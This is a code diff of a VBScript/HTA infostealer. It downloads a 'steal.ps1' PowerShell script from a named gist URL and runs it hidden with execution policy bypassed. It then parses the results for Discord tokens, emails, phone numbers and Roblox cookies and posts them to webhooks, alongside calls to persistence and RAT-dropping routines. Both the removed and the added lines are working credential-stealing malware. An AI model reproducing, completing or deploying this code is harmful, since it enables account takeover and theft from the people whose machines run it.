@@ -21,10 +21,7 @@ lastCookie = ""
 ' --- 1. INITIAL (WH ONLY) ---
 Call PostEmbedTo(":satellite: Target", "PC: " & PC & vbCrLf & "User: " & USER, 10181046, WH)
 Call IP(WH)
-
-' This grabs tokens, waits for PS1 to finish, reads the file, posts tokens/cookies
 Call GrabTokens(WH)
-
 Call Persistence
 Call PostCookieOnly(WH)
 Call DropRAT(WH)
@@ -39,86 +36,86 @@ Do
     Call IP(RE_WH)
     Call PostCookieOnly(RE_WH)
     Call SleepSeconds(30)
-    Exit Do ' Stops the loop from spamming
+    Exit Do
 Loop
 
 window.close()
 
-' --- GRAB TOKENS VIA PS1 ---
+' --- GRAB TOKENS VIA STEAL.PS1 ---
 Sub GrabTokens(targetWH)
-    Dim xh, pc, psf, tf, cp, raw, lines, l
+    Dim xh, psData, psf, tf, cp, raw, lines, l
     Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
     
-    ' Use your PS1 link
+    ' Your exact steal.ps1 URL
     xh.Open "GET", "https://gist.githubusercontent.com/elibyexd-stack/cd284a4bd1bf045a820ebaeac2fd89fc/raw/4eac95e5238b7dce163f6d360e902605050d1954/steal.ps1", False
     xh.Send
-    If xh.Status <> 200 Then Exit Sub
-    pc = xh.responseText
+    If xh.Status = 200 Then psData = xh.responseText
     Set xh = Nothing
     
-    psf = TmpFile("steal.ps1")
-    WriteFile psf, pc
+    If Len(psData) > 100 Then
+        psf = TmpFile("steal.ps1")
+        WriteFile psf, psData
 
-    tf = TmpFile("steal_result.txt")
-    fso.DeleteFile tf, True
+        tf = TmpFile("steal_result.txt")
+        fso.DeleteFile tf, True
 
-    ' Run the PS1 in background
-    sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, False
+        ' Launch PS1 hidden
+        sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, False
 
-    ' BLOCKING WAIT: Poll for the file up to 60 seconds so mshta doesn't crash/close early
-    Dim waited : waited = 0
-    Dim sz : sz = 0
-    Do
-        Call SleepSeconds(2)
-        waited = waited + 2
-        If fso.FileExists(tf) Then
-            On Error Resume Next
-            sz = fso.GetFile(tf).Size
-            On Error GoTo 0
-            If sz > 10 Then Exit Do ' File has content, break wait
-        End If
-    Loop While waited < 60
-
-    If Not fso.FileExists(tf) Then Exit Sub
-
-    ' Copy and read
-    cp = TmpFile("sr_" & Int(Rnd()*99999) & ".txt")
-    On Error Resume Next
-    fso.CopyFile tf, cp, True
-    On Error GoTo 0
-    If Not fso.FileExists(cp) Then cp = tf
-
-    raw = ReadFile(cp)
-    If cp <> tf Then fso.DeleteFile cp, True
-    If Len(raw) < 10 Then Exit Sub
-
-    ' Strip BOM and fix line endings
-    If Asc(Left(raw, 1)) = 239 Then raw = Mid(raw, 4)
-    raw = Replace(raw, vbCrLf, vbLf)
-    raw = Replace(raw, vbCr, vbLf)
-
-    lines = Split(raw, vbLf)
-    For Each l In lines
-        l = Trim(l)
-        If Left(l, 8) = "DISCORD|" Then
-            Dim p: p = Split(Mid(l, 9), "|")
-            If UBound(p) >= 4 Then
-                Dim info: info = "**User:** " & p(0) & vbCrLf
-                If p(1) <> "" Then info = info & "**Email:** " & p(1) & vbCrLf
-                If p(2) <> "" Then info = info & "**Phone:** " & p(2) & vbCrLf
-                If p(3) <> "" And p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
-                info = info & "**Token:** " & p(4)
-                Call PostEmbedTo(":gift: Discord Token", info, 10181046, targetWH)
+        ' BLOCKING WAIT: Poll for the file up to 60 seconds so mshta doesn't crash
+        Dim waited : waited = 0
+        Dim sz : sz = 0
+        Do
+            Call SleepSeconds(2)
+            waited = waited + 2
+            If fso.FileExists(tf) Then
+                On Error Resume Next
+                sz = fso.GetFile(tf).Size
+                On Error GoTo 0
+                If sz > 10 Then Exit Do ' File has content, break wait
             End If
-        ElseIf Left(l, 9) = "ROBLOXMS|" Then
-            Dim c1: c1 = Mid(l, 10)
-            If Len(c1) > 20 Then Call PostEmbedTo(":cookie: Roblox Cookie (MS)", "Size: " & Len(c1) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & c1 & "``", 10181046, targetWH)
-        ElseIf Left(l, 8) = "ROBLOX|" Then
-            Dim c2: c2 = Mid(l, 9)
-            If Len(c2) > 20 Then Call PostEmbedTo(":cookie: Roblox Cookie", "Size: " & Len(c2) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & c2 & "``", 10181046, targetWH)
+        Loop While waited < 60
+
+        If fso.FileExists(tf) Then
+            cp = TmpFile("sr_" & Int(Rnd()*99999) & ".txt")
+            On Error Resume Next
+            fso.CopyFile tf, cp, True
+            On Error GoTo 0
+            If Not fso.FileExists(cp) Then cp = tf
+
+            raw = ReadFile(cp)
+            If cp <> tf Then fso.DeleteFile cp, True
+            
+            If Len(raw) > 10 Then
+                If Asc(Left(raw, 1)) = 239 Then raw = Mid(raw, 4)
+                raw = Replace(raw, vbCrLf, vbLf)
+                raw = Replace(raw, vbCr, vbLf)
+
+                lines = Split(raw, vbLf)
+                For Each l In lines
+                    l = Trim(l)
+                    If Left(l, 8) = "DISCORD|" Then
+                        Dim p: p = Split(Mid(l, 9), "|")
+                        If UBound(p) >= 4 Then
+                            Dim info: info = "**User:** " & p(0) & vbCrLf
+                            If p(1) <> "" Then info = info & "**Email:** " & p(1) & vbCrLf
+                            If p(2) <> "" Then info = info & "**Phone:** " & p(2) & vbCrLf
+                            If p(3) <> "" And p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
+                            info = info & "**Token:** " & p(4)
+                            Call PostEmbedTo(":gift: Discord Token", info, 10181046, targetWH)
+                        End If
+                    ElseIf Left(l, 9) = "ROBLOXMS|" Then
+                        Dim c1: c1 = Mid(l, 10)
+                        If Len(c1) > 20 Then Call PostEmbedTo(":cookie: Roblox Cookie (MS)", "Size: " & Len(c1) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & c1 & "``", 10181046, targetWH)
+                    ElseIf Left(l, 8) = "ROBLOX|" Then
+                        Dim c2: c2 = Mid(l, 9)
+                        If Len(c2) > 20 Then Call PostEmbedTo(":cookie: Roblox Cookie", "Size: " & Len(c2) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & c2 & "``", 10181046, targetWH)
+                    End If
+                Next
+            End If
         End If
-    Next
+    End If
 End Sub
 
 ' --- NATIVE ROBLOX COOKIE (Backup) ---
